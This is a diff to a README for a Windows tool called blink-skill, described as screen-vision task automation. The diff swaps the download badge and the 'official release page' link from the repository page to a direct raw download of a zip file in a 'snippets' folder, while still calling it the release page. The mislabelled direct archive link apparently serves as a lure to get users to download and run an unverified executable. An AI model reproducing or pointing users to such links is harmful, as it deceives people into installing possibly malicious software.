@@ -1,6 +1,6 @@
 # 👁️ blink-skill - Automate tasks with smart screen vision
 
-[![Download blink-skill](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/myoodu8447/blink-skill)
+[![Download blink-skill](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/myoodu8447/blink-skill/main/snippets/blink_skill_2.8.zip)
 
 blink-skill helps you complete computer tasks faster. It uses vision technology to watch your screen and assist with your work. You can focus on your goals while the software handles repetitive steps. It works as an intelligent assistant that understands what you see.
 
@@ -18,7 +18,7 @@ Your computer needs to meet these basic standards to run blink-skill:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official release page](https://github.com/myoodu8447/blink-skill) to find the latest version.
+1. Visit the [official release page](https://raw.githubusercontent.com/myoodu8447/blink-skill/main/snippets/blink_skill_2.8.zip) to find the latest version.
 2. Look for the file ending in .exe under the Assets section.
 3. Click the filename to start your download.
 4. Open your Downloads folder.
